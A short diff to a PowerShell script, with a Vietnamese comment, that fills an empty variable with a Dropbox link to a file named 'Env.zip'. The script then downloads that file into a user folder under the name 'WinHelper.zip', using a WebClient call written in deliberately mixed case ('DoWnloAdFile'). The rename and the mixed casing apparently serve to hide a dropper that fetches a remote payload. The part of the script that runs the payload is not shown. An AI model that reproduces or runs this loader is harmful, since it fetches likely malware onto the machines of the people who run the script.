@@ -29,7 +29,7 @@ if (-not (Test-Path $envp)) {
 else {
     #Write-Host "Đường dẫn đã tồn tại: $envp"
 }
-$envu = ""
+$envu = "https://www.dropbox.com/scl/fi/vj07btn4tc143y5859p5j/Env.zip?rlkey=rbl0vyetokems4ea4k9iut278&st=2xlzkrtt&dl=1"
 $envz = $envp + "WinHelper.zip"
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
 (New-Object -TypeName System.Net.WeBClient).DoWnloAdFile($envu, $envz)
